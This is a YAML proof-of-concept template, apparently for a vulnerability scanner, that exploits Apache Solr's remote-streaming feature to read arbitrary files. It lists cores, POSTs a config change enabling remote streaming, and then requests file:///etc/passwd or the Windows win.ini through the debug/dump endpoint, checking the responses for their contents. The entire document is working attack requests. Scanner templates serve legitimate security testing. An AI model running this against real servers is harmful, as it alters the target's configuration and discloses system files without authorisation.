detail:
  author: whami-root(https://github.com/whami-root)
  links:
  - https://mp.weixin.qq.com/s?__biz=Mzg3NDU2MTg0Ng==&mid=2247484117&idx=1&sn=2fdab8cbe4b873f8dd8abb35d935d186
expression: linux0() && linux1() && linux2() || windows0() && windows1() && windows2()
manual: true
name: poc-yaml-solr-fileread
rules:
  linux0:
    expression: response.status == 200 && response.body.bcontains(b"responseHeader")
    output:
      core: search["core"]
      search: '"\"name\":\"(?P<core>.+?)\"".bsubmatch(response.body)'
    request:
      cache: true
      method: GET
      path: /solr/admin/cores?indexInfo=false&wt=json
  linux1:
    expression: response.body.bcontains(b"responseHeader")
    request:
      body: '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}

        '
      cache: true
      method: POST
      path: /solr/{{core}}/config
  linux2:
    expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    request:
      body: 'stream.url=file:///etc/passwd

        '
      cache: true
      headers:
        Content-Type: application/x-www-form-urlencoded
      method: POST
      path: /solr/{{core}}/debug/dump?param=ContentStreams
  windows0:
    expression: 'true'
    output:
      core: search["core"]
      search: '"\"name\":\"(?P<core>.+?)\"".bsubmatch(response.body)'
    request:
      cache: true
      method: GET
      path: /solr/admin/cores?indexInfo=false&wt=json
  windows1:
    expression: response.body.bcontains(b"responseHeader")
    request:
      body: '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}

        '
      cache: true
      method: POST
      path: /solr/{{core}}/config
  windows2:
    expression: response.status == 200 && response.body.bcontains(b"for 16-bit app
      support")
    request:
      body: 'stream.url=file:///c://windows/win.ini

        '
      cache: true
      headers:
        Content-Type: application/x-www-form-urlencoded
      method: POST
      path: /solr/{{core}}/debug/dump?param=ContentStreams
transport: http
